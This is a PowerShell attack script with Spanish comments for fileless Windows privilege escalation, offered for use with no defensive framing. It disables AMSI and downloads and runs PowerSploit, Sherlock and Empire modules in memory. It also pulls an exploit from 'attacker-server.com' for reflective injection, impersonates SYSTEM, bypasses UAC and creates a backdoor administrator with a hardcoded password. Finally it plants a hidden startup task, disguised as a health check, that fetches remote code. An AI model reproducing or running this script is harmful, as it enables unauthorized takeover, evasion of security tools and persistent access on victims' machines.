# Script de Elevación Automática de Privilegios - Fileless en Memoria
# Incluye bypass de AMSI/EDR y múltiples técnicas de escalada

Write-Host "=== ELEVACIÓN AUTOMÁTICA DE PRIVILEGIOS ===" -ForegroundColor Cyan
Write-Host "[+] Iniciando proceso de escalada de privilegios..." -ForegroundColor Yellow

# 1. BYPASS DE AMSI/EDR
Write-Host "[+] Aplicando bypass de AMSI/EDR..." -ForegroundColor Yellow
try {
    $amsiBypass = @"
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
"@
    Invoke-Expression $amsiBypass
    Write-Host "[+] Bypass de AMSI aplicado exitosamente" -ForegroundColor Green
} catch {
    Write-Host "[!] Error en bypass AMSI: $($_.Exception.Message)" -ForegroundColor Red
}

# 2. VERIFICAR PRIVILEGIOS ACTUALES
function Test-Admin {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (Test-Admin) {
    Write-Host "[+] Ya tienes privilegios de administrador!" -ForegroundColor Green
    return
}

# 3. CARGAR HERRAMIENTAS DE ESCALADA
Write-Host "[+] Cargando herramientas de escalada en memoria..." -ForegroundColor Yellow
try {
    # PowerUp.ps1 - Herramienta principal de escalada
    Write-Host "[+] Cargando PowerUp.ps1..." -ForegroundColor Cyan
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
    
    # Sherlock.ps1 - Detección de vulnerabilidades
    Write-Host "[+] Cargando Sherlock.ps1..." -ForegroundColor Cyan
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1')
    
    # Invoke-TokenManipulation.ps1 - Manipulación de tokens
    Write-Host "[+] Cargando Invoke-TokenManipulation..." -ForegroundColor Cyan
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-TokenManipulation.ps1')
    
    Write-Host "[+] Herramientas cargadas exitosamente" -ForegroundColor Green
} catch {
    Write-Host "[!] Error al cargar herramientas: $($_.Exception.Message)" -ForegroundColor Red
}

# 4. EJECUTAR CHECKS DE ESCALADA
Write-Host "[+] Ejecutando checks de escalada de privilegios..." -ForegroundColor Yellow
$escalationVectors = @()

# a. PowerUp Checks
try {
    $powerUpResults = Invoke-AllChecks
    $escalationVectors += $powerUpResults | Where-Object { $_.AbuseFunction -ne $null }
} catch {
    Write-Host "[!] Error en Invoke-AllChecks: $($_.Exception.Message)" -ForegroundColor Red
}

# b. Sherlock Checks
try {
    $sherlockResults = Find-AllVulns
    $escalationVectors += $sherlockResults | Where-Object { $_.Exploit -ne $null }
} catch {
    Write-Host "[!] Error en Find-AllVulns: $($_.Exception.Message)" -ForegroundColor Red
}

# 5. INTENTAR MÉTODOS DE ESCALADA
Write-Host "[+] Intentando métodos de escalada..." -ForegroundColor Yellow
$success = $false

# Intentar cada vector de escalada identificado
foreach ($vector in $escalationVectors) {
    try {
        if ($vector.AbuseFunction) {
            Write-Host "[+] Intentando: $($vector.AbuseFunction)" -ForegroundColor Cyan
            Invoke-Expression $vector.AbuseFunction
            Start-Sleep -Seconds 3
        } elseif ($vector.Exploit) {
            Write-Host "[+] Intentando explotar: $($vector.VulnName)" -ForegroundColor Cyan
            # Aquí se podrían cargar exploits específicos para vulnerabilidades
        }
        
        # Verificar si tenemos privilegios de administrador
        if (Test-Admin) {
            Write-Host "[+] ¡Éxito! Obtenidos privilegios de administrador con: $($vector.Name)" -ForegroundColor Green
            $success = $true
            break
        }
    } catch {
        Write-Host "[!] Error con $($vector.Name): $($_.Exception.Message)" -ForegroundColor Red
    }
}

# 6. MÉTODOS ALTERNATIVOS SI LOS ANTERIORES FALLAN
if (-not $success) {
    Write-Host "[+] Probando métodos alternativos..." -ForegroundColor Yellow
    
    # a. Token Manipulation
    try {
        Write-Host "[+] Intentando manipulación de tokens..." -ForegroundColor Cyan
        Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
        Start-Sleep -Seconds 3
        
        if (Test-Admin) {
            Write-Host "[+] ¡Éxito con manipulación de tokens!" -ForegroundColor Green
            $success = $true
        }
    } catch {
        Write-Host "[!] Error en manipulación de tokens: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    # b. Uso de vulnerabilidades conocidas
    if (-not $success) {
        try {
            Write-Host "[+] Intentando explotar vulnerabilidades del kernel..." -ForegroundColor Cyan
            
            # Cargar módulo de inyección PE
            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1')
            
            # Descargar y ejecutar exploit en memoria (ejemplo para CVE-2023-36802)
            $exploitUrl = "http://attacker-server.com/exploits/CVE-2023-36802.exe"
            $exploitBytes = (Invoke-WebRequest -Uri $exploitUrl -UseBasicParsing).Content
            Invoke-ReflectivePEInjection -PEBytes $exploitBytes -ForceASLR
            
            Start-Sleep -Seconds 5
            if (Test-Admin) {
                Write-Host "[+] ¡Éxito con explotación de vulnerabilidad!" -ForegroundColor Green
                $success = $true
            }
        } catch {
            Write-Host "[!] Error en explotación de vulnerabilidad: $($_.Exception.Message)" -ForegroundColor Red
        }
    }
    
    # c. Bypass UAC
    if (-not $success) {
        try {
            Write-Host "[+] Intentando bypass UAC..." -ForegroundColor Cyan
            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-BypassUAC.ps1')
            Invoke-BypassUAC -Command "net localgroup administrators $env:USERNAME /add"
            
            Start-Sleep -Seconds 5
            if (Test-Admin) {
                Write-Host "[+] ¡Éxito con bypass UAC!" -ForegroundColor Green
                $success = $true
            }
        } catch {
            Write-Host "[!] Error en bypass UAC: $($_.Exception.Message)" -ForegroundColor Red
        }
    }
}

# 7. VERIFICACIÓN FINAL Y ACCIONES POST-EXPLOTACIÓN
if (Test-Admin) {
    Write-Host "[+] ¡ESCALADA DE PRIVILEGIOS EXITOSA!" -ForegroundColor Green
    Write-Host "[+] Usuario actual: $([Security.Principal.WindowsIdentity]::GetCurrent().Name)" -ForegroundColor Cyan
    Write-Host "[+] Privilegios de administrador confirmados" -ForegroundColor Cyan
    
    # Ejecutar comandos como administrador
    Write-Host "`n[+] Información del sistema:" -ForegroundColor Yellow
    systeminfo | Select-String -Pattern "OS Name|OS Version|System Type" | ForEach-Object { Write-Host "   $_" -ForegroundColor White }
    
    Write-Host "`n[+] Miembros del grupo de administradores:" -ForegroundColor Yellow
    net localgroup administrators
    
    # Crear nuevo usuario administrativo (opcional)
    Write-Host "`n[+] Creando usuario administrativo de persistencia..." -ForegroundColor Yellow
    $newUser = "SysAdmin$((Get-Date).ToString('HHmm'))"
    $password = "P@ssw0rd123!"
    net user $newUser $password /add
    net localgroup administrators $newUser /add
    Write-Host "[+] Usuario creado: $newUser con contraseña: $password" -ForegroundColor Green
    
} else {
    Write-Host "[!] No se pudo obtener elevación de privilegios" -ForegroundColor Red
    Write-Host "[!] Intentando métodos de persistencia para escalada futura..." -ForegroundColor Yellow
    
    # Crear tarea programada para reintentar al inicio
    $taskName = "WindowsSystemHealthCheck"
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"IEX(New-Object Net.WebClient).DownloadString('http://attacker-server.com/privesc.ps1')`""
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description "Windows System Health Check" -Force
    Write-Host "[+] Tarea programada creada: $taskName" -ForegroundColor Cyan
}

Write-Host "`n=== PROCESO COMPLETADO ===" -ForegroundColor Cyan
